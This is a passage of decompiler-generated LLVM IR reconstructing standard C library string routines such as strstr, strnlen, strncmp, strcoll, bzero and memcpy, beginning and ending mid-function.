  uselistorder label %dec_label_pc_25e78, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_25e50, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_25f1c = inttoptr i32 %arg2 to i8*
  %v3_25f1c = call i32 @_memcpy(i8* %v2_25f1c, i32 %arg1)
  ret i32 %v3_25f1c
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_25f24.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_25f24 = phi i32 [ %v0_25f24.pre, %bb ], [ %v5_25f24, %bb3 ]
  %v0_25f20 = phi i32 [ %tmp, %bb ], [ %v5_25f20, %bb3 ]
  %v1_25f20 = inttoptr i32 %v0_25f20 to i8*
  %v2_25f20 = load i8, i8* %v1_25f20, align 1
  %v1_25f24 = inttoptr i32 %v0_25f24 to i8*
  %v2_25f24 = load i8, i8* %v1_25f24, align 1
  %v3_25f24 = zext i8 %v2_25f24 to i32
  %v2_25f28 = icmp eq i8 %v2_25f20, 0
  br i1 %v2_25f28, label %.dec_label_pc_25f34_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_25f24 = add i32 %v0_25f24, 1
  %v5_25f20 = add i32 %v0_25f20, 1
  %v3_25f20 = zext i8 %v2_25f20 to i32
  %v10_25f2c = icmp eq i8 %v2_25f20, %v2_25f24
  br i1 %v10_25f2c, label %entry, label %dec_label_pc_25f34

.dec_label_pc_25f34_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_25f34

dec_label_pc_25f34:                               ; preds = %bb3, %.dec_label_pc_25f34_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_25f34_crit_edge ], [ %v3_25f20, %bb3 ]
  %v2_25f34.pre-phi = sub nsw i32 %.pn, %v3_25f24
  ret i32 %v2_25f34.pre-phi

; uselistorder directives
  uselistorder i8 %v2_25f20, { 0, 2, 1 }
  uselistorder i32 %v0_25f20, { 1, 0 }
  uselistorder i32 %v0_25f24, { 1, 0 }
  uselistorder label %dec_label_pc_25f34, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_25f40 = load i32, i32* @r0, align 4
  %v1_25f40 = load i32, i32* @r1, align 4
  %v2_25f40 = inttoptr i32 %v0_25f40 to i8*
  %v3_25f40 = call i32 @_memcpy(i8* %v2_25f40, i32 %v1_25f40)
  ret i32 %v3_25f40
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  %v0_25f58 = call i32 @__GI_memset()
  ret i32 %v0_25f58
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_25f64 = load i8, i8* %arg2, align 1
  %v2_25f68 = icmp eq i8 %v3_25f64, 0
  %v1_26058.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_25f68, label %dec_label_pc_26054, label %dec_label_pc_25f70

dec_label_pc_25f70:                               ; preds = %entry
  %v1_25f70 = add i32 %v1_26058.pre, -1
  store i32 %v1_25f70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25f74

dec_label_pc_25f74:                               ; preds = %dec_label_pc_25f80, %dec_label_pc_25f70
  %v0_25f74 = phi i32 [ %v1_25f74, %dec_label_pc_25f80 ], [ %v1_25f70, %dec_label_pc_25f70 ]
  %v1_25f74 = add i32 %v0_25f74, 1
  %v2_25f74 = inttoptr i32 %v1_25f74 to i8*
  %v3_25f74 = load i8, i8* %v2_25f74, align 1
  store i32 %v1_25f74, i32* %r0.global-to-local, align 4
  %v2_25f78 = icmp eq i8 %v3_25f74, 0
  br i1 %v2_25f78, label %dec_label_pc_26050, label %dec_label_pc_25f80

dec_label_pc_25f80:                               ; preds = %dec_label_pc_25f74
  %v9_25f80 = icmp eq i8 %v3_25f74, %v3_25f64
  br i1 %v9_25f80, label %dec_label_pc_25f88, label %dec_label_pc_25f74

dec_label_pc_25f88:                               ; preds = %dec_label_pc_25f80
  %v2_25f88 = add i32 %tmp, 1
  %v3_25f88 = inttoptr i32 %v2_25f88 to i8*
  %v4_25f88 = load i8, i8* %v3_25f88, align 1
  %v2_25f8c = icmp eq i8 %v4_25f88, 0
  br i1 %v2_25f8c, label %dec_label_pc_26054, label %dec_label_pc_25f98

dec_label_pc_25f98:                               ; preds = %dec_label_pc_25f88
  %v1_25f98 = add i32 %v0_25f74, 2
  %v1_25fec = add i32 %tmp, 2
  %v2_25fec = inttoptr i32 %v1_25fec to i8*
  br label %dec_label_pc_25fe4

dec_label_pc_25fa8:                               ; preds = %dec_label_pc_26044
  %v3_25fa8 = load i8, i8* %v3_25fdc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_25fd4.preheader

dec_label_pc_25fd4.preheader:                     ; preds = %dec_label_pc_25fa8, %dec_label_pc_25fe4
  %v0_25fd43.in = phi i8 [ %v3_25fa8, %dec_label_pc_25fa8 ], [ %v3_25fdc.pn, %dec_label_pc_25fe4 ]
  %v9_25fd412 = icmp eq i8 %v0_25fd43.in, %v3_25f64
  br i1 %v9_25fd412, label %dec_label_pc_25fdc, label %dec_label_pc_25fb4

dec_label_pc_25fb4:                               ; preds = %dec_label_pc_25fd4.preheader, %dec_label_pc_25fd0
  %v0_25fbc = phi i32 [ %v1_25fd0, %dec_label_pc_25fd0 ], [ %storemerge41, %dec_label_pc_25fd4.preheader ]
  %v0_25fb4.in = phi i8 [ %v3_25fd0, %dec_label_pc_25fd0 ], [ %v0_25fd43.in, %dec_label_pc_25fd4.preheader ]
  %v2_25fb4 = icmp eq i8 %v0_25fb4.in, 0
  br i1 %v2_25fb4, label %dec_label_pc_26050, label %dec_label_pc_25fbc

dec_label_pc_25fbc:                               ; preds = %dec_label_pc_25fb4
  %v1_25fbc = add i32 %v0_25fbc, 1
  %v2_25fbc = inttoptr i32 %v1_25fbc to i8*
  %v3_25fbc = load i8, i8* %v2_25fbc, align 1
  store i32 %v1_25fbc, i32* %r0.global-to-local, align 4
  %v9_25fc0 = icmp eq i8 %v3_25fbc, %v3_25f64
  br i1 %v9_25fc0, label %dec_label_pc_25fdc, label %dec_label_pc_25fc8

dec_label_pc_25fc8:                               ; preds = %dec_label_pc_25fbc
  %v2_25fc8 = icmp eq i8 %v3_25fbc, 0
  br i1 %v2_25fc8, label %dec_label_pc_26050, label %dec_label_pc_25fd0

dec_label_pc_25fd0:                               ; preds = %dec_label_pc_25fc8
  %v1_25fd0 = add i32 %v0_25fbc, 2
  %v2_25fd0 = inttoptr i32 %v1_25fd0 to i8*
  %v3_25fd0 = load i8, i8* %v2_25fd0, align 1
  store i32 %v1_25fd0, i32* %r0.global-to-local, align 4
  %v9_25fd4 = icmp eq i8 %v3_25fd0, %v3_25f64
  br i1 %v9_25fd4, label %dec_label_pc_25fdc, label %dec_label_pc_25fb4

dec_label_pc_25fdc:                               ; preds = %dec_label_pc_25fbc, %dec_label_pc_25fd0, %dec_label_pc_25fd4.preheader
  %v0_25fdc = phi i32 [ %storemerge41, %dec_label_pc_25fd4.preheader ], [ %v1_25fbc, %dec_label_pc_25fbc ], [ %v1_25fd0, %dec_label_pc_25fd0 ]
  %v1_25fdc = add i32 %v0_25fdc, 1
  br label %dec_label_pc_25fe4

dec_label_pc_25fe4:                               ; preds = %dec_label_pc_25f98, %dec_label_pc_25fdc
  %storemerge41 = phi i32 [ %v1_25fdc, %dec_label_pc_25fdc ], [ %v1_25f98, %dec_label_pc_25f98 ]
  %v3_25fdc.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_25fdc.pn = load i8, i8* %v3_25fdc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_25fdc.pn, %v4_25f88
  br i1 %storemerge, label %dec_label_pc_25fe8, label %dec_label_pc_25fd4.preheader

dec_label_pc_25fe8:                               ; preds = %dec_label_pc_25fe4
  %v1_25fe8 = add i32 %storemerge41, 1
  %v2_25fe8 = inttoptr i32 %v1_25fe8 to i8*
  %v3_25fe8 = load i8, i8* %v2_25fe8, align 1
  %v4_25fe8 = zext i8 %v3_25fe8 to i32
  %v3_25fec = load i8, i8* %v2_25fec, align 1
  %v4_25fec = zext i8 %v3_25fec to i32
  %v9_25ff4 = icmp eq i8 %v3_25fe8, %v3_25fec
  %v1_25ffc = add i32 %storemerge41, -1
  store i32 %v1_25ffc, i32* %r0.global-to-local, align 4
  br i1 %v9_25ff4, label %dec_label_pc_26004, label %dec_label_pc_26044

dec_label_pc_26004:                               ; preds = %dec_label_pc_25fe8, %dec_label_pc_26034
  %v0_2601c = phi i32 [ %v1_26024, %dec_label_pc_26034 ], [ %v1_25fec, %dec_label_pc_25fe8 ]
  %v0_26014 = phi i32 [ %v1_26020, %dec_label_pc_26034 ], [ %v1_25fe8, %dec_label_pc_25fe8 ]
  %v0_26004 = phi i32 [ %v4_26034, %dec_label_pc_26034 ], [ %v4_25fe8, %dec_label_pc_25fe8 ]
  %v2_26004 = icmp eq i32 %v0_26004, 0
  br i1 %v2_26004, label %dec_label_pc_26054, label %dec_label_pc_2600c

dec_label_pc_2600c:                               ; preds = %dec_label_pc_26004
  %v1_2600c = add i32 %v0_26014, 1
  %v2_2600c = inttoptr i32 %v1_2600c to i8*
  %v3_2600c = load i8, i8* %v2_2600c, align 1
  %v1_26010 = add i32 %v0_2601c, 1
  %v2_26010 = inttoptr i32 %v1_26010 to i8*
  %v3_26010 = load i8, i8* %v2_26010, align 1
  %v4_26010 = zext i8 %v3_26010 to i32
  %v9_26018 = icmp eq i8 %v3_2600c, %v3_26010
  %v1_26020 = add i32 %v0_26014, 2
  %v1_26024 = add i32 %v0_2601c, 2
  br i1 %v9_26018, label %dec_label_pc_2602c, label %dec_label_pc_26044

dec_label_pc_2602c:                               ; preds = %dec_label_pc_2600c
  %v2_2602c = icmp eq i8 %v3_2600c, 0
  br i1 %v2_2602c, label %dec_label_pc_26054, label %dec_label_pc_26034

dec_label_pc_26034:                               ; preds = %dec_label_pc_2602c
  %v2_26034 = inttoptr i32 %v1_26024 to i8*
  %v3_26034 = load i8, i8* %v2_26034, align 1
  %v4_26034 = zext i8 %v3_26034 to i32
  %v2_26038 = inttoptr i32 %v1_26020 to i8*
  %v3_26038 = load i8, i8* %v2_26038, align 1
  %v9_2603c = icmp eq i8 %v3_26038, %v3_26034
  br i1 %v9_2603c, label %dec_label_pc_26004, label %dec_label_pc_26044

dec_label_pc_26044:                               ; preds = %dec_label_pc_26034, %dec_label_pc_2600c, %dec_label_pc_25fe8
  %v0_26044 = phi i32 [ %v4_25fec, %dec_label_pc_25fe8 ], [ %v4_26034, %dec_label_pc_26034 ], [ %v4_26010, %dec_label_pc_2600c ]
  %v2_26044 = icmp eq i32 %v0_26044, 0
  br i1 %v2_26044, label %dec_label_pc_26054, label %dec_label_pc_25fa8

dec_label_pc_26050:                               ; preds = %dec_label_pc_25f74, %dec_label_pc_25fc8, %dec_label_pc_25fb4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_26054

dec_label_pc_26054:                               ; preds = %dec_label_pc_26044, %dec_label_pc_2602c, %dec_label_pc_26004, %entry, %dec_label_pc_25f88, %dec_label_pc_26050
  %v1_26058 = phi i32 [ %v1_25f74, %dec_label_pc_25f88 ], [ 0, %dec_label_pc_26050 ], [ %v1_26058.pre, %entry ], [ %v1_25ffc, %dec_label_pc_26004 ], [ %v1_25ffc, %dec_label_pc_2602c ], [ %v1_25ffc, %dec_label_pc_26044 ]
  ret i32 %v1_26058

; uselistorder directives
  uselistorder i32 %v1_26020, { 1, 0 }
  uselistorder i8 %v3_25fdc.pn, { 1, 0 }
  uselistorder i8* %v3_25fdc.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_25fd0, { 1, 0 }
  uselistorder i32 %v1_25fd0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_25f74, { 0, 2, 3, 1 }
  uselistorder i8 %v3_25f64, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 9, 5, 6, 3, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_26054, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_26050, { 1, 2, 0 }
  uselistorder label %dec_label_pc_26004, { 1, 0 }
  uselistorder label %dec_label_pc_25fe4, { 1, 0 }
  uselistorder label %dec_label_pc_25fdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_25fb4, { 1, 0 }
  uselistorder label %dec_label_pc_25fd4.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_2605c = icmp eq i32 %arg2, 0
  br i1 %v2_2605c, label %bb, label %dec_label_pc_26070

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_26070:                               ; preds = %entry
  %v2_26070 = add i32 %tmp, %arg2
  %v3_26070 = icmp ult i32 %v2_26070, %tmp
  br i1 %v3_26070, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_26070
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_26070, %bb19
  %v5_26110 = phi i32 [ %v2_26070, %dec_label_pc_26070 ], [ -1, %bb19 ]
  %v1_260904 = urem i32 %tmp, 4
  %v2_260905 = icmp eq i32 %v1_260904, 0
  br i1 %v2_260905, label %dec_label_pc_26098, label %dec_label_pc_26080

dec_label_pc_26080:                               ; preds = %bb20, %dec_label_pc_2608c
  %v0_2608c = phi i32 [ %v1_2608c, %dec_label_pc_2608c ], [ %tmp, %bb20 ]
  %v1_26080 = inttoptr i32 %v0_2608c to i8*
  %v2_26080 = load i8, i8* %v1_26080, align 1
  %v2_26084 = icmp eq i8 %v2_26080, 0
  br i1 %v2_26084, label %dec_label_pc_2610c, label %dec_label_pc_2608c

dec_label_pc_2608c:                               ; preds = %dec_label_pc_26080
  %v1_2608c = add i32 %v0_2608c, 1
  %v1_26090 = urem i32 %v1_2608c, 4
  %v2_26090 = icmp eq i32 %v1_26090, 0
  br i1 %v2_26090, label %dec_label_pc_26098, label %dec_label_pc_26080

dec_label_pc_26098:                               ; preds = %dec_label_pc_2608c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_2608c, %dec_label_pc_2608c ]
  %v3_260fc30 = icmp ult i32 %storemerge.lcssa, %v5_26110
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_260fc30, label %dec_label_pc_260a0, label %dec_label_pc_2610c

dec_label_pc_260a0:                               ; preds = %dec_label_pc_260f8, %dec_label_pc_26098
  %v0_260f037 = phi i32 [ %v4_260a0, %dec_label_pc_260f8 ], [ %storemerge.lcssa, %dec_label_pc_26098 ]
  %v1_260a0 = inttoptr i32 %v0_260f037 to i32*
  %v2_260a0 = load i32, i32* %v1_260a0, align 4
  %v4_260a0 = add i32 %v0_260f037, 4
  %v2_260a4 = add i32 %v2_260a0, -16843009
  %v2_260a8 = and i32 %v2_260a4, -2139062144
  store i32 %v2_260a8, i32* @ip, align 4
  %v2_260ac = icmp eq i32 %v2_260a8, 0
  br i1 %v2_260ac, label %dec_label_pc_260f8, label %dec_label_pc_260b4

dec_label_pc_260b4:                               ; preds = %dec_label_pc_260a0
  %v2_260b4 = inttoptr i32 %v0_260f037 to i8*
  %v3_260b4 = load i8, i8* %v2_260b4, align 1
  %v2_260b8 = icmp eq i8 %v3_260b4, 0
  br i1 %v2_260b8, label %bb21, label %dec_label_pc_260c8

bb21:                                             ; preds = %dec_label_pc_260b4
  br label %dec_label_pc_2610c

dec_label_pc_260c8:                               ; preds = %dec_label_pc_260b4
  %v1_260c8 = add i32 %v0_260f037, 1
  %v2_260c8 = inttoptr i32 %v1_260c8 to i8*
  %v3_260c8 = load i8, i8* %v2_260c8, align 1
  %v2_260cc = icmp eq i8 %v3_260c8, 0
  br i1 %v2_260cc, label %dec_label_pc_2610c, label %dec_label_pc_260d8

dec_label_pc_260d8:                               ; preds = %dec_label_pc_260c8
  %v1_260d8 = add i32 %v0_260f037, 2
  %v2_260d8 = inttoptr i32 %v1_260d8 to i8*
  %v3_260d8 = load i8, i8* %v2_260d8, align 1
  %v2_260dc = icmp eq i8 %v3_260d8, 0
  br i1 %v2_260dc, label %dec_label_pc_2610c, label %dec_label_pc_260e8

dec_label_pc_260e8:                               ; preds = %dec_label_pc_260d8
  %v1_260e8 = add i32 %v0_260f037, 3
  %v2_260e8 = inttoptr i32 %v1_260e8 to i8*
  %v3_260e8 = load i8, i8* %v2_260e8, align 1
  %v2_260ec = icmp eq i8 %v3_260e8, 0
  br i1 %v2_260ec, label %dec_label_pc_2610c, label %dec_label_pc_260f8

dec_label_pc_260f8:                               ; preds = %dec_label_pc_260e8, %dec_label_pc_260a0
  %v3_260fc = icmp ult i32 %v4_260a0, %v5_26110
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_260fc, label %dec_label_pc_260a0, label %dec_label_pc_2610c

dec_label_pc_2610c:                               ; preds = %dec_label_pc_260f8, %dec_label_pc_26098, %dec_label_pc_26080, %dec_label_pc_260c8, %dec_label_pc_260d8, %dec_label_pc_260e8, %bb21
  %v1_2610c = phi i32 [ %v0_260f037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_26098 ], [ %v1_260c8, %dec_label_pc_260c8 ], [ %v1_260d8, %dec_label_pc_260d8 ], [ %v1_260e8, %dec_label_pc_260e8 ], [ %v5_26110, %dec_label_pc_260f8 ], [ %v0_2608c, %dec_label_pc_26080 ]
  %v3_2610c = icmp uge i32 %v5_26110, %v1_2610c
  %v9_2610c = icmp eq i32 %v5_26110, %v1_2610c
  %v2_26110 = xor i1 %v3_2610c, true
  %v3_26110 = or i1 %v9_2610c, %v2_26110
  br i1 %v3_26110, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_2610c
  %v6_26110 = sub i32 %v5_26110, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_2610c, %bb22
  %v5_26114 = phi i32 [ %v1_2610c, %dec_label_pc_2610c ], [ %v6_26110, %bb22 ]
  %v2_26114 = xor i1 %v9_2610c, true
  %v3_26114 = and i1 %v3_2610c, %v2_26114
  br i1 %v3_26114, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_26114 = sub i32 %v5_26114, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_2611c = phi i32 [ 0, %bb ], [ %v5_26114, %bb23 ], [ %v6_26114, %bb24 ]
  ret i32 %v1_2611c

; uselistorder directives
  uselistorder i1 %v3_2610c, { 1, 0 }
  uselistorder i32 %v4_260a0, { 1, 0 }
  uselistorder i32 %v0_260f037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_2608c, { 1, 0, 2 }
  uselistorder i32 %v5_26110, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_2610c, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_26080, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @__GI_strncmp(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_26128 = load i32, i32* %r2.global-to-local, align 4
  %v0_2612c = load i32, i32* %r0.global-to-local, align 4
  %tmp81 = icmp ult i32 %v0_26128, 4
  br i1 %tmp81, label %bb, label %bb48

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %entry, %bb
  %v4_26138 = phi i32 [ %v0_2612c, %entry ], [ 0, %bb ]
  br i1 %tmp81, label %.thread41, label %dec_label_pc_26140

.thread41:                                        ; preds = %bb48
  br label %dec_label_pc_26220thread-pre-split

dec_label_pc_26140:                               ; preds = %bb48
  %v3_26140 = udiv i32 %v0_26128, 4
  %v0_26148.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_26144

dec_label_pc_26144:                               ; preds = %dec_label_pc_261e8, %dec_label_pc_26140
  %v0_261e8 = phi i32 [ %v1_261e8, %dec_label_pc_261e8 ], [ %v3_26140, %dec_label_pc_26140 ]
  %v0_26184 = phi i32 [ %v1_261e0, %dec_label_pc_261e8 ], [ %v0_26148.pre, %dec_label_pc_26140 ]
  %v0_26180 = phi i32 [ %v1_261d8, %dec_label_pc_261e8 ], [ %v0_2612c, %dec_label_pc_26140 ]
  %v1_26144 = inttoptr i32 %v0_26180 to i8*
  %v2_26144 = load i8, i8* %v1_26144, align 1
  %v3_26144 = zext i8 %v2_26144 to i32
  store i32 %v3_26144, i32* %r0.global-to-local, align 4
  %v1_26148 = inttoptr i32 %v0_26184 to i8*
  %v2_26148 = load i8, i8* %v1_26148, align 1
  %v3_26148 = zext i8 %v2_26148 to i32
  %v2_2614c = sub nsw i32 %v3_26144, %v3_26148
  %v9_2614c = icmp eq i8 %v2_26144, %v2_26148
  br i1 %v9_2614c, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_26144
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_26144, %bb49
  %v1_26158 = phi i32 [ %v2_2614c, %dec_label_pc_26144 ], [ 1, %bb49 ]
  %v2_26154 = icmp eq i8 %v2_26144, 0
  br i1 %v2_26154, label %.thread, label %bb51

.thread:                                          ; preds = %bb50
  br label %dec_label_pc_2622c

bb51:                                             ; preds = %bb50
  %v2_2615c = icmp eq i32 %v1_26158, 0
  br i1 %v2_2615c, label %dec_label_pc_26164, label %dec_label_pc_2622c

dec_label_pc_26164:                               ; preds = %bb51
  %v1_26164 = add i32 %v0_26180, 1
  %v2_26164 = inttoptr i32 %v1_26164 to i8*
  %v3_26164 = load i8, i8* %v2_26164, align 1
  %v4_26164 = zext i8 %v3_26164 to i32
  store i32 %v4_26164, i32* %r0.global-to-local, align 4
  %v1_26168 = add i32 %v0_26184, 1
  %v2_26168 = inttoptr i32 %v1_26168 to i8*
  %v3_26168 = load i8, i8* %v2_26168, align 1
  %v4_26168 = zext i8 %v3_26168 to i32
  %v2_2616c = sub nsw i32 %v4_26164, %v4_26168
  %v9_2616c = icmp eq i8 %v3_26164, %v3_26168
  br i1 %v9_2616c, label %bb53, label %bb52

bb52:                                             ; preds = %dec_label_pc_26164
  br label %bb53

bb53:                                             ; preds = %dec_label_pc_26164, %bb52
  %v1_26178 = phi i32 [ %v2_2616c, %dec_label_pc_26164 ], [ 1, %bb52 ]
  %v2_26174 = icmp eq i8 %v3_26164, 0
  br i1 %v2_26174, label %bb54, label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %bb53, %bb54
  %v0_2617c = phi i32 [ %v1_26178, %bb53 ], [ 1, %bb54 ]
  %v2_2617c = icmp eq i32 %v0_2617c, 0
  br i1 %v2_2617c, label %dec_label_pc_2618c, label %dec_label_pc_2622c

dec_label_pc_2618c:                               ; preds = %bb55
  %v1_2618c = add i32 %v0_26180, 2
  %v2_2618c = inttoptr i32 %v1_2618c to i8*
  %v3_2618c = load i8, i8* %v2_2618c, align 1
  %v4_2618c = zext i8 %v3_2618c to i32
  store i32 %v4_2618c, i32* %r0.global-to-local, align 4
  %v1_26190 = add i32 %v0_26184, 2
  %v2_26190 = inttoptr i32 %v1_26190 to i8*
  %v3_26190 = load i8, i8* %v2_26190, align 1
  %v4_26190 = zext i8 %v3_26190 to i32
  %v2_26194 = sub nsw i32 %v4_2618c, %v4_26190
  %v9_26194 = icmp eq i8 %v3_2618c, %v3_26190
  br i1 %v9_26194, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_2618c
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_2618c, %bb56
  %v1_261a0 = phi i32 [ %v2_26194, %dec_label_pc_2618c ], [ 1, %bb56 ]
  %v2_2619c = icmp eq i8 %v3_2618c, 0
  br i1 %v2_2619c, label %bb58, label %bb59

bb58:                                             ; preds = %bb57
  br label %bb59

bb59:                                             ; preds = %bb57, %bb58
  %v0_261a4 = phi i32 [ %v1_261a0, %bb57 ], [ 1, %bb58 ]
  %v2_261a4 = icmp eq i32 %v0_261a4, 0
  br i1 %v2_261a4, label %dec_label_pc_261b8, label %dec_label_pc_26230

dec_label_pc_261b8:                               ; preds = %bb59
  %v1_261b8 = add i32 %v0_26180, 3
  %v2_261b8 = inttoptr i32 %v1_261b8 to i8*
  %v3_261b8 = load i8, i8* %v2_261b8, align 1
  %v4_261b8 = zext i8 %v3_261b8 to i32
  store i32 %v4_261b8, i32* %r0.global-to-local, align 4
  %v1_261bc = add i32 %v0_26184, 3
  %v2_261bc = inttoptr i32 %v1_261bc to i8*
  %v3_261bc = load i8, i8* %v2_261bc, align 1
  %v4_261bc = zext i8 %v3_261bc to i32
  %v2_261c0 = sub nsw i32 %v4_261b8, %v4_261bc
  %v9_261c0 = icmp eq i8 %v3_261b8, %v3_261bc
  br i1 %v9_261c0, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_261b8
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_261b8, %bb60
  %v1_261cc = phi i32 [ %v2_261c0, %dec_label_pc_261b8 ], [ 1, %bb60 ]
  %v2_261c8 = icmp eq i8 %v3_261b8, 0
  br i1 %v2_261c8, label %bb62, label %bb63

bb62:                                             ; preds = %bb61
  br label %bb63

bb63:                                             ; preds = %bb61, %bb62
  %v0_261d0 = phi i32 [ %v1_261cc, %bb61 ], [ 1, %bb62 ]
  %v2_261d0 = icmp eq i32 %v0_261d0, 0
  %v1_261d8 = add i32 %v0_26180, 4
  %v1_261e0 = add i32 %v0_26184, 4
  store i32 %v1_261e0, i32* @r1, align 4
  br i1 %v2_261d0, label %dec_label_pc_261e8, label %dec_label_pc_2622c

dec_label_pc_261e8:                               ; preds = %bb63
  %v1_261e8 = add i32 %v0_261e8, -1
  %v7_261e8 = icmp eq i32 %v0_261e8, 1
  br i1 %v7_261e8, label %dec_label_pc_261f0, label %dec_label_pc_26144

dec_label_pc_261f0:                               ; preds = %dec_label_pc_261e8
  %v1_261f0 = urem i32 %v0_26128, 4
  store i32 %v1_261f0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_26220

dec_label_pc_261f8:                               ; preds = %dec_label_pc_26220
  %v1_261f8 = inttoptr i32 %v0_26218 to i8*
  %v2_261f8 = load i8, i8* %v1_261f8, align 1
  %v3_261f8 = zext i8 %v2_261f8 to i32
  store i32 %v3_261f8, i32* %r0.global-to-local, align 4
  %v0_261fc = load i32, i32* @r1, align 4
  %v1_261fc = inttoptr i32 %v0_261fc to i8*
  %v2_261fc = load i8, i8* %v1_261fc, align 1
  %v3_261fc = zext i8 %v2_261fc to i32
  %v2_26200 = sub nsw i32 %v3_261f8, %v3_261fc
  %v9_26200 = icmp eq i8 %v2_261f8, %v2_261fc
  br i1 %v9_26200, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_261f8
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_261f8, %bb64
  %v1_2620c = phi i32 [ %v2_26200, %dec_label_pc_261f8 ], [ 1, %bb64 ]
  %v2_26208 = icmp eq i8 %v2_261f8, 0
  br i1 %v2_26208, label %.thread6, label %bb66

.thread6:                                         ; preds = %bb65
  br label %dec_label_pc_2622c

bb66:                                             ; preds = %bb65
  %v2_26210 = icmp eq i32 %v1_2620c, 0
  br i1 %v2_26210, label %dec_label_pc_26218, label %dec_label_pc_2622c

dec_label_pc_26218:                               ; preds = %bb66
  %v1_26218 = add i32 %v0_26218, 1
  %v1_2621c = add i32 %v0_261fc, 1
  store i32 %v1_2621c, i32* @r1, align 4
  br label %dec_label_pc_26220thread-pre-split

dec_label_pc_26220thread-pre-split:               ; preds = %.thread41, %dec_label_pc_26218
  %v1_2622c38 = phi i32 [ %v3_261f8, %dec_label_pc_26218 ], [ %v4_26138, %.thread41 ]
  %v0_2622c33 = phi i32 [ %v3_261fc, %dec_label_pc_26218 ], [ %v4_26138, %.thread41 ]
  %v0_261f828 = phi i32 [ %v1_26218, %dec_label_pc_26218 ], [ %v0_2612c, %.thread41 ]
  %v0_26220.pr = phi i32 [ %v1_26224, %dec_label_pc_26218 ], [ %v0_26128, %.thread41 ]
  br label %dec_label_pc_26220

dec_label_pc_26220:                               ; preds = %dec_label_pc_26220thread-pre-split, %dec_label_pc_261f0
  %v1_2622c37 = phi i32 [ %v1_2622c38, %dec_label_pc_26220thread-pre-split ], [ %v4_261b8, %dec_label_pc_261f0 ]
  %v0_2622c32 = phi i32 [ %v0_2622c33, %dec_label_pc_26220thread-pre-split ], [ %v4_261bc, %dec_label_pc_261f0 ]
  %v0_26218 = phi i32 [ %v0_261f828, %dec_label_pc_26220thread-pre-split ], [ %v1_261d8, %dec_label_pc_261f0 ]
